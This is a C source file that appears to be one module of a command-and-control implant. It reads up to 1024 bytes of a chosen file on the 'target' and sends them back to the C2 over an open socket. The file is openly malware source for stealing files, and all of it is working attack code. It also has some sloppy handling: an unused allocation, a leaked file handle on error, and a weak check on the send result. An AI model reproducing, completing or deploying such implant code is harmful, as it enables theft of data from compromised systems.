// Patrick Sacchet
// File handles all functionality pertaining to files on target

#include "File.h"

// Open, read and copy file bytes from specified path 
int handleGetFile(char* filepath, uint64_t* file_size, char* file_bytes)
{
    int status = 1, bytes_read = 0;
    FILE* file_ptr;

    // Open specified file path for reading
    file_ptr = fopen(filepath, "r");
    if (file_ptr == NULL)
    {
        printf("Failed to open file!\n");
        status = 0;
        goto cleanup;
    }

    // Currently limited to reading only 1024 bytes from a file
    bytes_read = fread(file_bytes, 1, 1024, file_ptr);
    if (bytes_read == 0)
    {
        printf("Read 0 bytes from file!\n");
        status = 0;
        goto cleanup;
    }

    *file_size = bytes_read;

    fclose(file_ptr);


cleanup:
    return status;
}


// Send the actual file contents we got back to the C2
int sendFileContents(int* client_fd, uint64_t file_size, char* file_bytes)
{
    int status = 1, bytes_sent = 0;
    Response response = { 0 };

    response.response = getfile;

    response.getfileresponse.filesize = file_size;

    response.getfileresponse.filebytes = (char*)malloc(sizeof(char) * file_size);
    if (response.getfileresponse.filebytes == NULL)
    {
        printf("OOM!\n");
        status = 0;
        goto cleanup;
    }

    bytes_sent = send(*client_fd, (void*)file_bytes, file_size, 0);
    if (bytes_sent == 0)
    {
        printf("Failed to send file bytes back to C2!\n");
        status = 0;
        goto cleanup;
    }


cleanup:
    if (response.getfileresponse.filebytes != NULL)
    {
        free(response.getfileresponse.filebytes);
    }

    memset(&response, 0, sizeof(response));

    return status;
}